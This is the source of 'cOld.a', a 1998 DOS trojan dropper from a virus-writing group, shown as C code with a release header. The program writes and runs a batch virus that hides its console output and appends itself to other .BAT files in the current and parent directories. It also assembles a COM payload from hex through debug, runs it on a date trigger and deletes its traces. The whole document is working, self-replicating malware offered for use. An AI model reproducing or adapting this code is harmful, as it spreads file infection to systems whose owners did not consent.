cOld.a by Sblip

______________________________________________________________________

Virus Author: Sblip of [Metaphase VX Team]  Oct 98.
Virus Name  : cOld.a
Virus Target: *.BAT 
Target OS...: DOS
Virus Info..: Trojan Dropper Of A Virus Batch File
Encryption..: No.
Payload.....: Yes. Bat.cOld.a Virus. 
Stealth.....: No.
TSR.........: No.
AntiAV......: NO.
______________________________________________________________________

/* :: [cOld.a]
   :: by -ߣip- / Metaphase VX Team

*/

#include <stdio.h>
#include <stdlib.h>
main()
{
int i;
char e1[] = "@ctty nul._cOld";
char e2[] = "@echo off%_cOld%";
char e3[] = "for %%a in (*.bat ..\\*.bat) do set cOld=%%a";
char e4[] ="find \"cOld\"<%cOld%";
char e5[] ="if errorlevel 1 find \"cOld\"<%0.BAT>>%cOld%";
char e6[] ="echo.|date|find \"23\">nul.cOld";
char e7[] ="if errorlevel 1 goto cOld_exit";
char e8[] ="echo n $cOld$.com>cOld.t";
char e9[] ="echo e 0100 EB 3D 90 00 4B 02 02 00 00 54 68 65 44 72 61 77>>cOld.t";

char e10[] ="echo e 0110 20 43 4F 4D 20 66 69 6C 65 20 53 63 72 65 65 6E>>cOld.t";
char e11[] ="echo e 0120 20 53 61 76 65 1A 55 6E 73 75 70 70 6F 72 74 65>>cOld.t";
char e12[] ="echo e 0130 64 20 56 69 64 65 6F 20 4D 6F 64 65 0D 0A 24 B4>>cOld.t";
char e13[] ="echo e 0140 0F CD 10 BB 00 B8 3C 02 74 18 3C 03 74 14 C6 06>>cOld.t";
char e14[] ="echo e 0150 03 01 00 BB 00 B0 3C 07 74 08 BA 26 01 B4 09 CD>>cOld.t";
char e15[] ="echo e 0160 21 C3 8E C3 8B 3E 07 01 BE F0 01 BA DA 03 B3 09>>cOld.t";

char e16[] ="echo e 0170 8B 0E 04 01 FC 33 C0 AC 3C 1B 75 05 80 F4 80 EB>>cOld.t";
char e17[] ="echo e 0180 6A 3C 10 73 07 80 E4 F0 0A E0 EB 5F 3C 18 74 13>>cOld.t";
char e18[] ="echo e 0190 73 1F 2C 10 02 C0 02 C0 02 C0 02 C0 80 E4 8F 0A>>cOld.t";
char e19[] ="echo e 01A0 E0 EB 48 8B 3E 07 01 81 C7 A0 00 89 3E 07 01 EB>>cOld.t";
char e20[] ="echo e 01B0 3A 8B E9 B9 01 00 3C 19 75 08 AC 8A C8 B0 20 4D>>cOld.t";
char e21[] ="echo e 01C0 EB 0A 3C 1A 75 07 AC 4D 8A C8 AC 4D 41 80 3E 03>>cOld.t";

char e22[] ="echo e 01D0 01 00 74 13 8A F8 EC D0 D8 72 FB EC 22 C3 75 FB>>cOld.t";
char e23[] ="echo e 01E0 8A C7 AB E2 F1 EB 02 F3 AB 8B CD E3 02 E2 88 C3>>cOld.t";
char e24[] ="echo e 01F0 0F 10 19 4F 18 19 4F 18 19 4F 18 19 4F 18 19 4F>>cOld.t";
char e25[] ="echo e 0200 18 19 4F 18 19 05 08 DF 07 B1 01 DC 19 02 DB DC>>cOld.t";
char e26[] ="echo e 0210 20 08 DC 01 DF 08 B1 01 1A 03 DF 20 DB DF DF DC>>cOld.t";
char e27[] ="echo e 0220 DF DF DD 20 DF DD DF DF DC 19 02 DF DB DF DF DC>>cOld.t";

char e28[] ="echo e 0230 20 20 DF DB 20 20 DF DB 20 DF DB DF DF DC 19 02>>cOld.t";
char e29[] ="echo e 0240 DC DF DF DF DC 20 08 DC 01 DF DB 1A 03 DF 0F 19>>cOld.t";
char e30[] ="echo e 0250 05 18 19 06 08 B1 20 01 DB 20 DB 20 DB 19 02 08>>cOld.t";
char e31[] ="echo e 0260 DB 19 02 FA 19 03 01 DB 0F 19 04 01 DB 19 02 09>>cOld.t";
char e32[] ="echo e 0270 DB 19 02 01 DB 19 02 DB 20 20 B1 19 02 08 B1 20>>cOld.t";
char e33[] ="echo e 0280 20 09 DB 19 02 01 DB 20 B2 0F 19 07 09 DB 0F 19>>cOld.t";

char e34[] ="echo e 0290 09 18 19 06 01 B1 20 20 DB 20 20 DB 20 20 08 DC>>cOld.t";
char e35[] ="echo e 02A0 B1 01 DC DC 19 02 08 FA 20 20 DB 20 20 FA 20 01>>cOld.t";
char e36[] ="echo e 02B0 DF DB DF DF DF DB 20 20 DF DB DF DF DF 20 20 DF>>cOld.t";
char e37[] ="echo e 02C0 DB DF DF DF 08 DB 20 01 DF DB DF DF DF DB 20 20>>cOld.t";
char e38[] ="echo e 02D0 DF DF DC DC 19 02 DC DB DC DC 0F 19 07 18 19 06>>cOld.t";
char e39[] ="echo e 02E0 01 DB DD 19 03 DB DD 08 DF 20 01 DB 0F 19 07 08>>cOld.t";

char e40[] ="echo e 02F0 B1 0F 19 04 01 DB 19 02 DB 19 02 DB 0F 19 05 01>>cOld.t";
char e41[] ="echo e 0300 DB 19 02 09 DB 20 20 01 DB 19 02 DB 0F 19 05 01>>cOld.t";
char e42[] ="echo e 0310 DB 20 08 DF 20 01 DB 0F 19 09 18 19 05 08 DC 01>>cOld.t";
char e43[] ="echo e 0320 DF 19 03 08 DC 01 DF 20 20 08 DC 01 DF 1A 03 DC>>cOld.t";
char e44[] ="echo e 0330 19 02 08 DC 01 DB DC 19 02 08 DC 01 DF 20 20 08>>cOld.t";
char e45[] ="echo e 0340 DC 01 DF 20 20 08 DE DF DD 19 03 DC 01 DF 20 20>>cOld.t";

char e46[] ="echo e 0350 08 DC 01 DF 20 08 DC 01 DF 20 20 08 DC 01 DF 20>>cOld.t";
char e47[] ="echo e 0360 08 DF 01 1A 03 DC DF 20 20 08 DC 01 DF 1A 03 DC>>cOld.t";
char e48[] ="echo e 0370 0F 19 05 18 19 19 08 FA 0F 19 34 18 19 4F 18 19>>cOld.t";
char e49[] ="echo e 0380 08 08 1A 04 C4 07 1A 03 C4 0F C4 C4 C4 07 1A 05>>cOld.t";
char e50[] ="echo e 0390 C4 0F C4 C4 C4 07 1A 03 C4 08 1A 04 C4 00 C4 20>>cOld.t";
char e51[] ="echo e 03A0 08 1A 03 C4 07 C4 C4 C4 0F C4 C4 C4 07 1A 04 C4>>cOld.t";

char e52[] ="echo e 03B0 0F 1A 03 C4 07 1A 03 C4 08 1A 06 C4 0F 19 08 18>>cOld.t";
char e53[] ="echo e 03C0 19 4F 18 19 1E 08 DF 01 DC 19 03 08 DF 01 DC 20>>cOld.t";
char e54[] ="echo e 03D0 08 DC 01 DF DC 19 02 DF DB 0F 19 1F 18 19 1F 01>>cOld.t";
char e55[] ="echo e 03E0 DB 0F 19 04 09 DB 19 02 01 DF DC 20 DC DF 0F 19>>cOld.t";
char e56[] ="echo e 03F0 20 18 19 1F 01 DB 0F 19 04 01 DB 0F 19 04 01 DB>>cOld.t";
char e57[] ="echo e 0400 0F 19 22 18 19 20 01 DB 19 02 DB 19 03 DC DF 20>>cOld.t";

char e58[] ="echo e 0410 09 DB 0F 19 21 18 19 1F 08 DF 01 1A 03 DF 19 02>>cOld.t";
char e59[] ="echo e 0420 07 DF 01 DF 19 03 DF DF 0F 19 1F 18 19 4F 18 19>>cOld.t";
char e60[] ="echo e 0430 4F 18 19 4F 18 19 4F 18 19 4F 18>>cOld.t";
char e61[] ="echo rcx>>cOld.t";
char e62[] ="echo 3C0>>cOld.t";
char e63[] ="echo w>>cOld.t";
char e64[] ="echo q>>cOld.t";
char e65[] ="debug<cOld.t>nul";
char e66[] ="del cOld.t";
char e67[] ="$cOld$";
char e68[] ="del $cOld$.com";

char e69[] ="ctty con._!";


FILE *fp;
	fp = fopen("stuff.bat", "a+");
fprintf(fp,"%s\n",e1);
fprintf(fp,"%s\n",e2);
fprintf(fp,"%s\n",e3);
fprintf(fp,"%s\n",e4);
fprintf(fp,"%s\n",e5);
fprintf(fp,"%s\n",e6);
fprintf(fp,"%s\n",e7);
fprintf(fp,"%s\n",e8);
fprintf(fp,"%s\n",e9);
fprintf(fp,"%s\n",e10);
fprintf(fp,"%s\n",e11);
fprintf(fp,"%s\n",e12);
fprintf(fp,"%s\n",e13);
fprintf(fp,"%s\n",e14);
fprintf(fp,"%s\n",e15);
fprintf(fp,"%s\n",e16);
fprintf(fp,"%s\n",e17);
fprintf(fp,"%s\n",e18);

fprintf(fp,"%s\n",e19);
fprintf(fp,"%s\n",e20);
fprintf(fp,"%s\n",e21);
fprintf(fp,"%s\n",e22);
fprintf(fp,"%s\n",e23);
fprintf(fp,"%s\n",e24);
fprintf(fp,"%s\n",e25);
fprintf(fp,"%s\n",e26);
fprintf(fp,"%s\n",e27);
fprintf(fp,"%s\n",e28);
fprintf(fp,"%s\n",e29);
fprintf(fp,"%s\n",e30);
fprintf(fp,"%s\n",e31);
fprintf(fp,"%s\n",e32);
fprintf(fp,"%s\n",e33);
fprintf(fp,"%s\n",e34);
fprintf(fp,"%s\n",e35);
fprintf(fp,"%s\n",e36);
fprintf(fp,"%s\n",e37);
fprintf(fp,"%s\n",e38);

fprintf(fp,"%s\n",e39);
fprintf(fp,"%s\n",e40);
fprintf(fp,"%s\n",e41);
fprintf(fp,"%s\n",e42);
fprintf(fp,"%s\n",e43);
fprintf(fp,"%s\n",e44);
fprintf(fp,"%s\n",e45);
fprintf(fp,"%s\n",e46);
fprintf(fp,"%s\n",e47);
fprintf(fp,"%s\n",e48);
fprintf(fp,"%s\n",e49);
fprintf(fp,"%s\n",e50);
fprintf(fp,"%s\n",e51);
fprintf(fp,"%s\n",e52);
fprintf(fp,"%s\n",e53);
fprintf(fp,"%s\n",e54);
fprintf(fp,"%s\n",e55);
fprintf(fp,"%s\n",e56);
fprintf(fp,"%s\n",e57);
fprintf(fp,"%s\n",e58);

fprintf(fp,"%s\n",e59);
fprintf(fp,"%s\n",e60);
fprintf(fp,"%s\n",e61);
fprintf(fp,"%s\n",e62);
fprintf(fp,"%s\n",e63);
fprintf(fp,"%s\n",e64);
fprintf(fp,"%s\n",e65);
fprintf(fp,"%s\n",e66);
fprintf(fp,"%s\n",e67);
fprintf(fp,"%s\n",e68);
fprintf(fp,"%s\n",e69);
fclose(fp);
system("stuff.bat");

exit(0);
}